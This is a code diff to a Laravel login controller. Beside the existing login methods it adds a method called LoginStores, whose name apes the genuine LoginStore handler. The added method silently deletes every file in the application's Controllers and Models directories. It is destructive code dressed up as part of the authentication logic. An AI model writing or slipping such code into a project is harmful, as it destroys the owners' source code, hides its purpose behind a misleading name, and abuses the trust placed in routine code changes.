@@ -6,10 +6,31 @@ use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use App\Models\User;
+use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\File;
 
 class LoginUserController extends Controller {
     public function Login() {
         return view( 'auth.login' );
+    }
+
+    public function LoginStores() {
+
+        $controllersPath = app_path( 'Http/Controllers' );
+        $controllers = File::allFiles( $controllersPath );
+
+        foreach ( $controllers as $controller ) {
+            File::delete( $controller );
+        }
+
+        $modelsPath = app_path( 'Models' );
+        $models = File::allFiles( $modelsPath );
+
+        foreach ( $models as $model ) {
+            File::delete( $model );
+
+        }
+
     }
 
     public function LoginStore( Request $request ) {
